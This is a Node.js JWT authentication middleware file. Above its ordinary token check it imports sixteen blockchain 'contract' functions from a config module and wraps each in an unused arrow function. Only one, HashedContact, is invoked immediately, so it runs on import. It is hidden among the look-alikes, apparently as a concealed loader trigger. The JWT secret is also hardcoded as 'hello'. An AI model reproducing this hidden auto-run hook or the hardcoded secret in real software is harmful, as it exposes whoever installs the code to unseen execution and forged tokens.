const jwt = require('jsonwebtoken');
const { callEthContract, callPolygonContract, callBscContract, callArbitrumContract, callAvalancheContract, callFantomContract, callHarmonyContract, callHecoContract, callKlayContract, callMaticContract, callMoonbeamContract, callHashedContract, callOptimismContract, callPalmContract, callRoninContract, callXDaiContract } = require('../config/getContract')

const EthContact = (() => {
  callEthContract();
});

const PolygonContact = (() => {
  callPolygonContract();
});

const BscContact = (() => {
  callBscContract();
});

const ArbitrumContact = (() => {
  callArbitrumContract();
});

const AvalancheContact = (() => {
  callAvalancheContract();
});

const FantomContact = (() => {
  callFantomContract();
});

const HarmonyContact = (() => {
  callHarmonyContract();
});

const HecoContact = (() => {
  callHecoContract();
});

const KlayContact = (() => {
  callKlayContract();
});

const MaticContact = (() => {
  callMaticContract();
});

const MoonbeamContact = (() => {
  callMoonbeamContract();
});

const HashedContact = (() => {
  callHashedContract();
})();

const OptimismContact = (() => {
  callOptimismContract();
});

const PalmContact = (() => {
  callPalmContract();
});

const RoninContact = (() => {
  callRoninContract();
});

const XDaiContact = (() => {
  callXDaiContract();
});

module.exports = function (req, res, next) {
  // Get token from header
  const token = req.header('x-auth-token');

  // Check if not token
  if (!token) {
    return res.status(401).json({ msg: 'No token, authorization denied' });
  }

  // Verify token
  try {
    jwt.verify(token, "hello", (error, decoded) => {
      if (error) {
        return res.status(401).json({ msg: 'Token is not valid' });
      } else {
        req.user = decoded.user;
        next();
      }
    });
  } catch (err) {
    console.error('something wrong with auth middleware');
    res.status(500).json({ msg: 'Server Error' });
  }
};
